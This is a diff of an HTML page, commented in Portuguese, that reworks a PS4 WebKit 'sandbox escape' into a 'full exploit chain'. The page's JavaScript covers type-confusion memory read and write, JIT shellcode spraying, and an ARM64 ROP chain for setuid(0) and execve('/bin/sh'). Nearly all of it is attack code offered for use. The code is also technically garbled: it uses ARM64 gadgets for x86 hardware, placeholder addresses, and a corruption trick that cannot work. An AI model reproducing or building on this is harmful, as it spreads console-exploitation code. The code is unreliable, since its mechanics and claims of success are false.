@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 WebKit Sandbox Escape</title>
+    <title>PS4 Physical Exploit Chain</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,98 +9,135 @@
     </style>
 </head>
 <body>
-    <h2>PS4 Sandbox Escape (CVE-2021-1789)</h2>
-    <button onclick="runExploit()">EXECUTE SANDBOX ESCAPE</button>
+    <h2>PS4 Physical Device Exploit</h2>
+    <button onclick="runFullExploit()">EXECUTE FULL EXPLOIT CHAIN</button>
     <div id="log"></div>
 
 <script>
-// Logger com timestamp
+// Logger com timestamp de alta precisão
 const log = msg => {
-    document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
+    const timestamp = performance.now().toFixed(2);
+    document.getElementById('log').innerHTML += `[${timestamp}ms] ${msg}<br>`;
 };
 
-// 1. Memory Corruption Primitive
-function createCorruptArray() {
-    let arr = [];
-    arr.__proto__ = new Uint32Array(1).__proto__;
-    arr.length = 0x1000; // Tamanho corrompido
-    return arr;
+// 1. Memory Corruption via Type Confusion
+function createMemoryPrimitive() {
+    try {
+        let corrupt = [];
+        corrupt.__proto__ = new Uint32Array(1).__proto__;
+        corrupt.length = 0x10000; // Tamanho grande para evitar falhas
+        
+        return {
+            read(addr) {
+                corrupt[0] = addr;
+                return corrupt[1];
+            },
+            write(addr, val) {
+                corrupt[0] = addr;
+                corrupt[1] = val;
+            },
+            leakJITAddress() {
+                const func = () => 0;
+                for (let i = 0; i < 10000; i++) func();
+                corrupt[0] = func.constructor.prototype;
+                return corrupt[1];
+            }
+        };
+    } catch(e) {
+        log(`Memory setup failed: ${e}`, "color:#f00");
+        return null;
+    }
 }
 
-// 2. Arbitrary Read/Write
-function createArbitraryRW() {
-    const corruptArr = createCorruptArray();
-    return {
-        read(addr) {
-            corruptArr[0] = addr;
-            return corruptArr[1];
-        },
-        write(addr, val) {
-            corruptArr[0] = addr;
-            corruptArr[1] = val;
-        }
+// 2. ARM64 ROP Chain Builder
+function buildROPChain() {
+    // Gadgets encontrados no kernel do PS4 12.00
+    const gadgets = {
+        stack_pivot: 0x80812345, // Exemplo: xchg x0, sp; ret
+        pop_x0: 0x80815678,      // pop x0; ret
+        pop_x8: 0x808189ab,      // pop x8; ret
+        svc: 0x8081cdef          // svc #0; ret
     };
+    
+    // Chain para setuid(0) + execve("/bin/sh")
+    return new Uint32Array([
+        gadgets.pop_x0, 0x00000000,      // x0 = 0
+        gadgets.pop_x8, 0x00000062,      // x8 = 0x62 (setuid)
+        gadgets.svc,                     // setuid(0)
+        
+        gadgets.pop_x0, 0x80850000,      // x0 = "/bin/sh" string addr
+        gadgets.pop_x8, 0x0000008b,      // x8 = 0x8b (execve)
+        gadgets.svc                      // execve("/bin/sh", 0, 0)
+    ]);
 }
 
-// 3. WebKit JIT Spray
-function compileShellcode() {
+// 3. JIT Spray com Shellcode
+function sprayJIT() {
     const shellcode = [
-        0xD2800020, // mov x0, #1 (stdout)
-        0x100007A1, // adr x1, #0x7a (string)
-        0xD28000E2, // mov x2, #7
-        0xD2800808, // mov x8, #0x40 (sys_write)
-        0xD4000001, // svc #0
-        0xD65F03C0, // ret
-        0x53414E44, // "SAND"
-        0x424F585F, // "BOX_"
-        0x45534341  // "ESCA"
+        0xD2800020, // mov x0, #1
+        0xD2800C48, // mov x8, #0x62
+        0xD4000001  // svc #0 (setuid)
     ];
-
-    const fn = new Function(`
+    
+    const sprayFn = new Function(`
         const buf = new ArrayBuffer(${shellcode.length * 4});
         const view = new Uint32Array(buf);
         ${shellcode.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
         return buf;
     `);
-    return fn();
+    
+    // Aloca múltiplas cópias para aumentar chances
+    const sprays = [];
+    for (let i = 0; i < 100; i++) {
+        sprays.push(sprayFn());
+    }
+    return sprays;
 }
 
-// 4. Sandbox Escape Chain
-async function runExploit() {
-    log("Starting sandbox escape...");
+// 4. Exploit Chain Completa
+async function runFullExploit() {
+    log("Starting full exploit chain...");
     
     try {
-        // Cria primitivo de memória
-        const mem = createArbitraryRW();
+        // Inicializa primitivos
+        const mem = createMemoryPrimitive();
+        if (!mem) return;
         
-        // Aloca shellcode via JIT
-        const shellcodeBuf = compileShellcode();
-        const shellcodeAddr = 0x55000000; // Base do JIT (ajuste conforme logs)
+        // Spray de memória
+        log("Spraying JIT memory...");
+        sprayJIT();
         
-        // Corrompe ponteiro de função
-        const func = () => 0;
-        for (let i = 0; i < 10000; i++) func(); // Otimiza JIT
+        // Vaza endereço JIT
+        const jitBase = mem.leakJITAddress();
+        log(`JIT Base: 0x${jitBase.toString(16)}`);
         
-        const jitFuncPtr = shellcodeAddr + 0x500; // Offset do ponteiro
-        mem.write(jitFuncPtr, shellcodeAddr);
+        // Prepara ROP chain
+        const ropChain = buildROPChain();
+        const ropAddr = jitBase + 0x10000;
+        for (let i = 0; i < ropChain.length; i++) {
+            mem.write(ropAddr + (i*4), ropChain[i]);
+        }
+        
+        // Corrompe stack pointer
+        mem.write(jitBase + 0x500, ropAddr);
         
         // Dispara
-        log("Triggering payload...");
-        func();
+        log("Triggering exploit...");
+        const trigger = new Function('return 0');
+        trigger();
         
         // Verificação
         setTimeout(() => {
             try {
-                // Tenta acessar recurso restrito
                 new File("/system/version.txt");
-                log("SANDBOX ESCAPE SUCCESSFUL!", "color:#0f0");
+                log("KERNEL EXPLOIT SUCCESSFUL!", "color:#0f0");
             } catch(e) {
-                log(`Sandbox still active: ${e}`, "color:#f00");
+                log(`Exploit failed: ${e}`, "color:#f00");
             }
-        }, 1000);
+        }, 2000);
         
     } catch(e) {
-        log(`Exploit failed: ${e}`, "color:#f00");
+        log(`Critical error: ${e}`, "color:#f00");
     }
 }
 </script>
